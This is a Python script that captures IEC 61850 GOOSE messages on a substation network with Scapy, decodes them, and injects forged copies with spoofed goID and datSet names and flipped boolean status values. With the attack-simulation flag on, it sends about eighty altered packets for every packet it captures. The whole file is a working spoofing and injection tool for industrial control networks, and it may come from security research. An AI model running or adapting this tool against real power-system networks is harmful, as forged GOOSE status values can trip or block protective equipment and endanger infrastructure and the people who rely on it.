###############################
# Import Python modules
###############################
import os, sys, inspect, struct

###############################
# Import ASN1 modules
###############################
from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import tag
from pyasn1.type.univ import Boolean, Integer, BitString

###############################
# Import Scapy and Goose Modules
###############################
# We have to tell script where to find the Goose module in parent directory
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)

from scapy.layers.l2 import Ether
from goose.ralle001_hsr import HSR
from scapy.all import sniff, sendp, Raw, rdpcap
from goose.goose import GOOSE, GOOSEPDU
from goose.goose_pdu import IECGoosePdu

DEBUG = 0   # 0: off 1: Show Goose Payload 2: Full Debug
SHOW_PACKETS = 0    # 0: off, 1: Shows all the packets
ONLY_SHOW_DIFF = 0  # 0: shows everything, 1: Only shows packets which are different
ATTACK_SIM = 1      # 0: no attack simulation, 1: showcases how an attack should work

if len(sys.argv) > 1:
    inf = sys.argv[1]
else:
    inf = None

GOOSE_TYPE = 0x88b8
SV_TYPE = 0x88ba

def goose_test(pkt):
    # Check for GOOSE Ether Type in Dot1Q, Ether, or HSR layer
    return any(
        pkt.haslayer(layer) and pkt[layer].type == GOOSE_TYPE
        for layer in ['Dot1Q', 'Ether', 'HSR']
    )

class GooseData:
    def __init__(self, datSet, goID, time, allData, valueList):
        self.datSet = datSet
        self.goID = goID
        self.time = time
        self.allData = allData
        self.valueList = valueList

    def getDatSet(self):
        return self.datSet

    def getGoID(self):
        return self.goID

    def getAllData(self):
        return str(self.allData)

    def addItemToList(self, newItem):
        self.valueList.append(newItem)

    def getList(self):
        return self.valueList

    def getTime(self):
        return self.time

def goose_pdu_decode(encoded_data):

    # Debugging on
    if DEBUG > 2: 
        from pyasn1 import debug
        debug.setLogger(debug.Debug('all'))

    g = IECGoosePdu().subtype(
        implicitTag=tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            1
        )
    )
    decoded_data, _ = decoder.decode(
        encoded_data,
        asn1Spec=g
    )

    return decoded_data

def goose_pdu_encode(decoded_data):
    # Encode the modified GOOSE data back into a binary PDU
    try:
        # Using the pyasn1 encoder to encode the modified GOOSE data
        encoded_data = encoder.encode(decoded_data)
        return encoded_data
    except Exception as e:
        print(f"Error encoding GOOSE PDU: {e}")
        return None

def floating_point_converter(hex_string):
    format_type = '<f' if len(hex_string) == 8 else '<d' if len(hex_string) == 16 else None
    if not format_type:
        return 0

    bytes_data = bytes.fromhex(hex_string)[::-1]
    return struct.unpack(format_type, bytes_data)[0]

modified_packets = set()

def attack(p, gd, new_goid, change_datset, do_changes, change_name, change_back):
    try:
        # Modify goID and encode modified GOOSE PDU
        original_goid = gd['goID']
        
        if change_name:
            gd['goID'] = new_goid
            gd['datSet'] = change_datset

        first = True
        for item in gd['allData']:
            if first and hasattr(item, 'getComponentByName') and do_changes and not change_back:
                # Check if the item has a boolean component
                boolean_value = item.getComponentByName('boolean')
                if boolean_value is not None and boolean_value == False:
                    # Set the boolean value to True
                    item.setComponentByName('boolean', True)
                    first = False
                elif boolean_value is not None and boolean_value == True:
                    item.setComponentByName('boolean', False)
                    first = False
            elif first and hasattr(item, 'getComponentByName') and not do_changes and change_back:
                boolean_value = item.getComponentByName('boolean')
                if boolean_value is not None and boolean_value == True:
                    # Set the boolean value to True
                    item.setComponentByName('boolean', False)
                    first = False
        
        modified_gpdu = goose_pdu_encode(gd)
        if not modified_gpdu:
            return
        
        # Update APDU header length and combine with modified GOOSE PDU
        goose_layer = p[Raw]
        apdu_header = goose_layer.load[:8]
        updated_apdu_header = apdu_header[:2] + struct.pack(">H", len(apdu_header) + len(modified_gpdu)) + apdu_header[4:]
        modified_apdu = updated_apdu_header + modified_gpdu

        # Create modified packet
        modified_packet = p.copy()
        modified_packet[Raw].load = modified_apdu

        # Add modified packet ID and send
        modified_packets.add((modified_packet[Ether].src, modified_packet[Ether].dst, bytes(modified_packet[Raw].load)))
        sendp(modified_packet, iface="en1", verbose=False)
        print(f"Sent modified GOOSE packet: goID changed from {original_goid} to {gd['goID']}")
    except Exception as e:
        print(f"Error: {e}")

devsrc = {}
datSetList = []
gooseData = []
svData = []
dictIDs = {}

def packet_handler(p):
    global modified_packets
    if goose_test(p):
        packet_id = (p[Ether].src, p[Ether].dst, bytes(p[Raw].load))
        if packet_id in modified_packets:
            return

        gd = goose_pdu_decode(GOOSE(p.load)[GOOSEPDU].original)
        src_mac, dst_mac, goid = p['Ether'].src, p['Ether'].dst, gd['goID']

        temp_list = []
        for item in gd['allData']:
            for i in item.values():
                try:
                    temp_list.append(floating_point_converter(i.asOctets().hex()[2:]))
                    if isinstance(i, BitString):
                        temp_list.append(i)
                except:
                    if not isinstance(i, (Boolean, Integer)):
                        for item2 in i:
                            for i2 in item2.values():
                                for i3 in i2:
                                    for i4 in i3.values():
                                        temp_list.append(floating_point_converter(i4.asOctets().hex()[2:]))
                    else:
                        temp_list.append(i)

        gooseData.append(GooseData(str(gd['datSet']), goid, p.time, gd['allData'], temp_list))

        devgoose = (dst_mac, str(gd['datSet']), "GOOSE")
        devsrc.setdefault(src_mac, []).append(devgoose) if devgoose not in devsrc.get(src_mac, []) else None

        datSetList.append(str(gd['datSet']))

        if ATTACK_SIM == 1:
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", True, True, False)
            attack(p, gd, "333", "222", False, True, True)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", True, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)
            attack(p, gd, "333", "222", False, True, False)
            attack(p, gd, "b_Device", "b_Device", False, True, False)
            attack(p, gd, "l_Device", "l_Device", False, True, False)
            attack(p, gd, "test_Device", "test_Device", False, True, False)


if inf is None:
    sniff(prn=packet_handler, store=0)
else:
    sniff(prn=packet_handler, store=0, iface=inf)